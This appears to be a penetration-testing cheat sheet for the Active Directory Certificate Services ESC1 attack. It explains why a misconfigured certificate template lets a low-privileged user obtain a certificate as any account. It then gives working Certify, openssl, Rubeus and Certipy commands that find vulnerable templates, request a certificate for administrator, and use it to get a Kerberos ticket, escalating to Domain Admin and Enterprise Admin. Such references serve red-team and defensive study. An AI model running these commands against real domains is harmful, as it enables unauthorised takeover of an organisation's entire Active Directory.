# ESC1

{% hint style="info" %}
Enrolee can request cert for ANY user
{% endhint %}

## Why It Works

* A certificate template has **`ENROLLEE_SUPPLIES_SUBJECT`** set on `msPKI-Certificate-Name-Flag`, which means the *requester* (not the CA/AD) gets to define the Subject Alternative Name (SAN) of the certificate they're requesting.
* The template also has an EKU that permits **Client Authentication** (or Smart Card Logon/PKINIT Client Authentication), and grants **enrollment rights** to a low-privileged principal (e.g. Domain Users/Authenticated Users).
* PKINIT (Kerberos cert-based auth) maps a certificate to an AD identity primarily via the SAN's UPN/DNS value. Since the client fully controls the SAN, they simply set it to `administrator@domain.com` (or any target UPN) when submitting the CSR.
* The CA blindly signs whatever SAN was requested (it doesn't verify the requester actually owns that identity), producing a **valid, CA-signed certificate for Administrator** that the low-priv attacker now possesses.
* Using that cert for Kerberos PKINIT (`asktgt`) returns a TGT **as the impersonated user** - full domain compromise if the target is a Domain/Enterprise Admin.

## Prerequisites

* Enrollment rights (Read + Enroll) on the vulnerable template for a principal you control.
* `msPKI-Certificate-Name-Flag` includes `ENROLLEE_SUPPLIES_SUBJECT`.
* Template EKU includes Client Authentication / Smart Card Logon / any EKU usable for PKINIT.
* Manager approval is **not** required, and no authorized-signature requirement blocks the request.

### Tools

* [Certify](https://github.com/GhostPack/Certify)
* [Certipy](https://github.com/ly4k/Certipy)

**Find template that has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag.**&#x20;

* `Certify.exe find /enrolleeSuppliesSubject`&#x20;
* Target template allows enrollment to the target group where the compromised user is a member

### **Escalation to DA**

*
  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:administrator`&#x20;
* **Convert from cert.pem to pfx and use it to request a TGT for DA.**
  * `openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out
     esc1.pfx`
* `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /ptt (/password:SecretPass@123) - optional`&#x20;

{% hint style="info" %}
**Certipy** - one tool handles enumeration, request, and PFX conversion, no `openssl.exe`/Rubeus needed:

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <target-template-name> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endhint %}

### Escalation to EA

*
  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:<parent-domain>\administrator`&#x20;
* **Convert from cert.pem to pfx and use it to request a TGT for EA.**
  * `openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out
     esc3.pfx`
* `Rubeus.exe asktgt /user:<Parent-Domain-FQDN>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /ptt`   <sup><sub>/password:SecretPass@123 - optional<sub></sup> &#x20;

{% hint style="info" %}
**Certipy:**

```bash
certipy req -u <user>@<domain> -p <password> -ca <CA-Name> -template <target-template-name> -upn administrator@<parent-domain>
certipy auth -pfx administrator.pfx -dc-ip <parent-domain-dc>
```
{% endhint %}
